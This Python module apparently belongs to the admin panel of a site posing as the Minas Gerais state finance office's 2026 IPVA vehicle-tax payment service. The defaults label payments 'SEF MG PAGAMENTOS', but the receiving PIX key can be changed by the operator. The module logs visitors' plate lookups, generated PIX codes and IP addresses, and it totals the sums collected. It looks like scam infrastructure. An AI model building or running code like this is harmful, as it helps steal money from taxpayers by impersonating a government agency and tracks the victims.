import json
import os
from datetime import datetime
from threading import Lock

# File paths for data storage
DATA_DIR = "admin_data"
CONFIG_FILE = os.path.join(DATA_DIR, "config.json")
CONSULTAS_FILE = os.path.join(DATA_DIR, "consultas.json")
PIX_FILE = os.path.join(DATA_DIR, "pix_generated.json")
ONLINE_USERS_FILE = os.path.join(DATA_DIR, "online_users.json")

# Thread-safe locks
config_lock = Lock()
consultas_lock = Lock()
pix_lock = Lock()
users_lock = Lock()

# Create data directory if it doesn't exist
os.makedirs(DATA_DIR, exist_ok=True)

def load_json(filepath, default=None):
    """Load JSON file safely"""
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8') as f:
                return json.load(f)
    except:
        pass
    return default if default is not None else {}

def save_json(filepath, data):
    """Save JSON file safely"""
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        print(f"Error saving {filepath}: {e}")
        return False

# ===== CONFIG MANAGEMENT =====

def get_config():
    """Get current PIX configuration"""
    with config_lock:
        config = load_json(CONFIG_FILE, {
            "pix_key": "00000000000",
            "pix_name": "SEF MG PAGAMENTOS",
            "pix_city": "BELO HORIZONTE",
            "pix_description": "IPVA 2026"
        })
        return config

def save_config(pix_key, pix_name, pix_city):
    """Save PIX configuration"""
    with config_lock:
        config = {
            "pix_key": pix_key,
            "pix_name": pix_name,
            "pix_city": pix_city,
            "pix_description": "IPVA 2026",
            "updated_at": datetime.now().isoformat()
        }
        return save_json(CONFIG_FILE, config)

# ===== CONSULTAS TRACKING =====

def log_consulta(plate, vehicle, ipva_value):
    """Log a new vehicle consultation"""
    with consultas_lock:
        consultas = load_json(CONSULTAS_FILE, [])
        
        consulta = {
            "timestamp": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
            "plate": plate,
            "vehicle": vehicle,
            "ipva_value": ipva_value
        }
        
        consultas.insert(0, consulta)  # Add to beginning
        
        # Keep only last 100 consultas
        consultas = consultas[:100]
        
        save_json(CONSULTAS_FILE, consultas)
        return True

def get_consultas():
    """Get all consultas"""
    with consultas_lock:
        return load_json(CONSULTAS_FILE, [])

# ===== PIX TRACKING =====

def log_pix_generated(plate, amount, pix_code):
    """Log a generated PIX code"""
    with pix_lock:
        pix_list = load_json(PIX_FILE, [])
        
        pix_entry = {
            "timestamp": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
            "plate": plate,
            "amount": amount,
            "code": pix_code
        }
        
        pix_list.insert(0, pix_entry)  # Add to beginning
        
        # Keep only last 100 PIX codes
        pix_list = pix_list[:100]
        
        save_json(PIX_FILE, pix_list)
        return True

def get_pix_generated():
    """Get all generated PIX codes"""
    with pix_lock:
        return load_json(PIX_FILE, [])

# ===== ONLINE USERS TRACKING =====

def update_online_user(ip, page):
    """Update or add online user"""
    with users_lock:
        users = load_json(ONLINE_USERS_FILE, {})
        
        users[ip] = {
            "ip": ip,
            "current_page": page,
            "last_activity": datetime.now().isoformat()
        }
        
        # Remove users inactive for more than 5 minutes
        now = datetime.now()
        active_users = {}
        for user_ip, user_data in users.items():
            try:
                last_active = datetime.fromisoformat(user_data['last_activity'])
                if (now - last_active).seconds < 300:  # 5 minutes
                    active_users[user_ip] = user_data
            except:
                pass
        
        save_json(ONLINE_USERS_FILE, active_users)
        return True

def get_online_users():
    """Get list of online users"""
    with users_lock:
        users_dict = load_json(ONLINE_USERS_FILE, {})
        users_list = []
        
        for ip, data in users_dict.items():
            try:
                last_active = datetime.fromisoformat(data['last_activity'])
                users_list.append({
                    "ip": ip,
                    "current_page": data.get('current_page', 'Unknown'),
                    "last_activity": last_active.strftime("%H:%M:%S")
                })
            except:
                pass
        
        return users_list

# ===== STATS =====

def get_stats():
    """Get dashboard statistics"""
    consultas = get_consultas()
    pix_list = get_pix_generated()
    online_users = get_online_users()
    
    # Calculate total value
    total_value = 0
    for pix in pix_list:
        try:
            # Extract numeric value from "R$ 247,22" format
            amount_str = pix['amount'].replace('R$', '').replace('.', '').replace(',', '.').strip()
            total_value += float(amount_str)
        except:
            pass
    
    total_value_formatted = f"R$ {total_value:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
    
    return {
        "consultas": len(consultas),
        "pix_gerados": len(pix_list),
        "usuarios_online": len(online_users),
        "valor_total": total_value_formatted,
        "consultas_list": consultas[:20],  # Last 20
        "pix_list": pix_list[:20],  # Last 20
        "online_users": online_users
    }

# Alias for backward compatibility
def log_pix(plate, amount, pix_code):
    """Alias for log_pix_generated"""
    return log_pix_generated(plate, amount, pix_code)
